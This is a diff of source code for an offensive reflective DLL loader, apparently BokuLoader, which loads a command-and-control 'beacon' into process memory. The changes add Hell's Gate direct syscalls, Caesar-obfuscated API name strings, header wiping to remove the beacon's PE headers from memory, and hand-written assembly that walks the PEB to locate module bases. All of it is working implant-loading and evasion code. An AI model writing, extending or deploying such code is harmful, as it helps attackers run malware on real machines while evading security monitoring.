@@ -26,6 +26,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     size = rdll_src.size;
     HellsGate(getSyscallNumber(api.pNtAllocateVirtualMemory));
     status = ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+    // If we fail to allocate memory for the loaded beacon then exit the loading process
     if (!NT_SUCCESS(status))
         return NULL;
 
@@ -33,24 +34,32 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 
     rdll_dst.dllBase = base;
 
-    // Deallocate the first memory page (4096/0x1000 bytes)
-    base = rdll_dst.dllBase;
-    size = 4096;
-    //size = rdll_src.SizeOfHeaders;
+    // Deallocate the first memory page for the beacon we are loading
+    // This way after cleanup there will be no beacon PE headers in the process
+    size = rdll_src.SizeOfHeaders;
     HellsGate(getSyscallNumber(api.pNtFreeVirtualMemory));
-    status = ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
+    ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
   
     doSections(&rdll_dst, rdll_src);
     doImportTable(&api, &rdll_dst, rdll_src);
     doRelocations(&api, &rdll_dst, rdll_src);
    
+    // Get the entry point for beacon located in the .text section
+    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
+
+    // Change memory protections of loaded beacon .text section to RX
     unsigned int oldprotect = 0;
     base = rdll_dst.TextSection;
     size = rdll_dst.TextSectionSize;
     unsigned int newprotect = PAGE_EXECUTE_READ;
+    // NtProtectVirtualMemory syscall
     HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
     ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
-    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
+
+    // DLL_PROCESS_ATTACH 1
+    // The DLL is being loaded into the virtual address space of the current process. DLLs can use this opportunity to initialize any instance data or to use the TlsAlloc function to allocate a thread local storage (TLS) index.
+    // https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain
+    // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required as this resolves the hellopacket information and then returns to the caller.
     ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
     return rdll_dst.EntryPoint;
 }
@@ -429,6 +438,14 @@ void getApis(APIS * api){
     basicCaesar_Decrypt(17,str_RtlInitAnsiString,65);
     api->RtlInitAnsiString = xGetProcAddress(str_RtlInitAnsiString, &ntdll);
 
+    char str_NtUnmapViewOfSection[] = {0x8a,0xb0,0x91,0xaa,0xa9,0x9d,0xac,0x92,0xa5,0xa1,0xb3,0x8b,0xa2,0x8f,0xa1,0x9f,0xb0,0xa5,0xab,0xaa,0};
+    basicCaesar_Decrypt(20,str_NtUnmapViewOfSection,60);
+    api->NtUnmapViewOfSection = xGetProcAddress(str_NtUnmapViewOfSection, &ntdll);
+
+    char str_NtQueryVirtualMemory[] = {0xa5,0xcb,0xa8,0xcc,0xbc,0xc9,0xd0,0xad,0xc0,0xc9,0xcb,0xcc,0xb8,0xc3,0xa4,0xbc,0xc4,0xc6,0xc9,0xd0,0};
+    basicCaesar_Decrypt(20,str_NtQueryVirtualMemory,87);
+    api->NtQueryVirtualMemory = xGetProcAddress(str_NtQueryVirtualMemory, &ntdll);
+
     
 }
 void * xLoadLibrary(void * library_name){
@@ -549,55 +566,59 @@ __asm__(
     "pop rbx \n"
     "ret \n"                        // return initRdllAddr
 
-"getDllBase: \n" // RAX, RBX, RCX, RDX, RSI, RDI, R10, R11
+"getDllBase: \n" // RAX, R8, RCX, RDX, RSI, r9, R10, R11
     "push rcx \n"                   // save our string arg on the top of the stack
-    "call StringLengthA \n"               // RAX will be the strlen
+   "call StringLengthA \n"          // RAX will be the strlen
     "sub rax, 0x4 \n"               // subtract 4 from our string. Truncates the ".dll" or ".exe"
     "mov r10, rax \n"               // save strlen in the r10 reg
     "pop rcx \n"                    // get our string arg from the top of the stack
-    "xor rbx, rbx \n"
-    "xor rdi, rdi \n"               // Clear RDI
-    "xor rsi, rsi \n"               // Clear RSI
-    "mov rbx, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
-    "mov rbx, [rbx+0x18] \n"        // _PEB_LDR_DATA
-    "mov rbx, [rbx+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
-    "mov r11, rbx \n"               // save so we know the end of the modList
-  "crawl: \n"
-    "mov rdx, [rbx+0x50] \n"        // BaseDllName Buffer - AKA Unicode string for module in InMemoryOrderModuleList
+    "mov r8, 0 \n"                  // Clear
+    "mov r9, 0 \n"                  // Clear 
+    "mov r8, gs:[0x60] \n"          // ProcessEnvironmentBlock // GS = TEB
+    "mov r8, [r8+0x18] \n"          // _PEB_LDR_DATA
+    "mov r8, [r8+0x20] \n"          // InMemoryOrderModuleList - First Entry (probably the host PE File)
+    "mov r11, r8 \n"                // save so we know the end of the modList
+  "crawl: \n" // RDX RCX R10
+    "mov rdx, [r8+0x50] \n"         // BaseDllName Buffer - AKA Unicode string for module in InMemoryOrderModuleList
     "push rcx \n"                   // save our string arg on the top of the stack
     "mov rax, r10 \n"               // reset our string counter
-    "call cmpDllStr \n"             // see if our strings match
+   "call cmpDllStr \n"              // see if our strings match
     "pop rcx \n"                    // remove string arg from the top of the stack
     "test rax, rax \n"              // is cmpDllStr match?
-    "je found \n"
-    "mov rbx, [rbx] \n"             // InMemoryOrderLinks Next Entry
-    "cmp r11, [rbx] \n"             // Are we back at the same entry in the list?
-    "je failGetDllBase \n"          // if we went through all modules in modList then return 0 to caller of getDllBase 
-    "jmp crawl \n"
-  "cmpDllStr: \n"
-    "mov sil, [rcx] \n"             // move the byte in string that we pass as an arg to getDllBase() into the lowest byte of the RSI register
-    "mov dil, [rdx] \n"             // move the byte in string from the InMemList into the lowest byte of the RDI register
-    "or sil, 0x20 \n"               // convert to lowercase if uppercase
-    "or dil, 0x20 \n"               // convert to lowercase if uppercase
-    "cmp dil, sil \n"               // cmp character byte in the strings
-    "jne failcmpDllStr \n"          // if no match then return to the caller of cmpDllStr
-    "dec rax \n"                    // decrement the counter
-    "test rax, rax \n"              // is counter zero?
-    "je matchStr \n"                // if we matched the string 
-    "add rdx, 0x2 \n"               // move the unicode string to the next byte and skip the 0x00
-    "inc rcx \n"                    // move our string to the next char
-    "jmp cmpDllStr \n"              // compare the next string byte
-  "failcmpDllStr: \n"
-    "mov rax, 0xFFFF \n"            // return 0xFFFF
-    "ret \n"
-  "matchStr: \n"
-    "xor rax, rax \n"               // return 0x0 
-    "ret \n"
+   "je successGetDllBase \n"
+    "mov r8, [r8] \n"               // InMemoryOrderLinks Next Entry
+    "cmp r11, [r8] \n"              // Are we back at the same entry in the list?
+   "je failGetDllBase \n"           // if we went through all modules in modList then return 0 to caller of getDllBase 
+   "jmp crawl \n"
+      "cmpDllStr: \n"
+          "push r8 \n"              // Save register and fix before exiting cmpDllStr()
+          "mov r8, 0 \n"            // Clear
+        "cmpDllStr_loop: \n"
+          "mov r8b, [rcx] \n"       // move the byte in string that we pass as an arg to getDllBase() into the lowest byte of the RSI register
+          "mov r9b, [rdx] \n"       // move the byte in string from the InMemList into the lowest byte of the RDI register
+          "or r8b, 0x20 \n"         // convert to lowercase if uppercase
+          "or r9b, 0x20 \n"         // convert to lowercase if uppercase
+          "cmp r9b, r8b \n"         // cmp character byte in the strings
+         "jne failcmpDllStr \n"     // if no match then return to the caller of cmpDllStr
+          "dec rax \n"              // decrement the counter
+          "test rax, rax \n"        // is counter zero?
+         "je matchStr \n"           // if we matched the string 
+          "add rdx, 0x2 \n"         // move the unicode string to the next byte and skip the 0x00
+          "inc rcx \n"              // move our string to the next char
+         "jmp cmpDllStr_loop \n"    // compare the next string byte
+            "failcmpDllStr: \n"
+              "mov rax, 0xFFFF \n"  // return 0xFFFF
+              "jmp exitCmpDllStr \n"
+            "matchStr: \n"
+              "xor rax, rax \n"     // return 0x0 
+        "exitCmpDllStr: \n"
+          "pop r8 \n"           // restore the r8 register
+          "ret \n"
   "failGetDllBase: \n"
-    "xor rax, rax \n"               // return 0x0 
+    "xor rax, rax \n"           // return 0x0 
     "jmp end \n"
-  "found: \n"
-    "mov rax, [rbx+0x20] \n"        // DllBase Address in process memory
+  "successGetDllBase: \n"
+    "mov rax, [r8+0x20] \n"         // DllBase Address in process memory
   "end: \n"
     "ret \n"                        // return to caller
 
